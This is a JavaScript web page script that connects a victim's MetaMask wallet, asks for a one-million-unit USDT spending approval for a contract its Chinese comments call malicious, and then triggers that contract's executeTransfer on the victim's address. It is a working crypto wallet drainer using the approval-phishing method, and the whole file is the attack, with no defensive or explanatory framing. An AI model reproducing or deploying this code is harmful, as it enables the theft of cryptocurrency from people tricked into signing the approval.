const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
const MALICIOUS_CONTRACT_ADDRESS = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 恶意合约地址
const AMOUNT_TO_APPROVE = ethers.utils.parseUnits("1000000", 18); // 授权金额

let provider;
let signer;

// USDT 合约 ABI
const usdtAbi = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) external view returns (uint256)"
];

// 恶意合约 ABI
const maliciousAbi = [
    "function executeTransfer(address user) external"
];

async function connectWallet() {
    if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        try {
            const accounts = await provider.send("eth_requestAccounts", []);
            document.getElementById('connectButton').innerHTML = `Connected: ${accounts[0]}`;
            document.getElementById('approveButton').disabled = false; // 启用授权按钮
        } catch (error) {
            console.error('Failed to connect wallet', error);
            alert('Failed to connect wallet');
        }
    } else {
        alert('MetaMask is not installed');
    }
}

async function approveTokens() {
    const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);

    try {
        const tx = await usdtContract.approve(MALICIOUS_CONTRACT_ADDRESS, AMOUNT_TO_APPROVE);
        await tx.wait();
        alert('USDT approved');
        document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
    } catch (error) {
        console.error('Approval failed', error);
        alert('Approval failed');
    }
}

async function executeTransfer() {
    const maliciousContract = new ethers.Contract(MALICIOUS_CONTRACT_ADDRESS, maliciousAbi, signer);

    try {
        const userAddress = await signer.getAddress();
        const tx = await maliciousContract.executeTransfer(userAddress);
        await tx.wait();
        alert('Transfer executed successfully');
    } catch (error) {
        console.error('Transfer failed', error);
        alert('Transfer failed');
    }
}

// 添加事件监听
document.getElementById('connectButton').addEventListener('click', connectWallet);
document.getElementById('approveButton').addEventListener('click', approveTokens);
document.getElementById('executeTransferButton').addEventListener('click', executeTransfer);
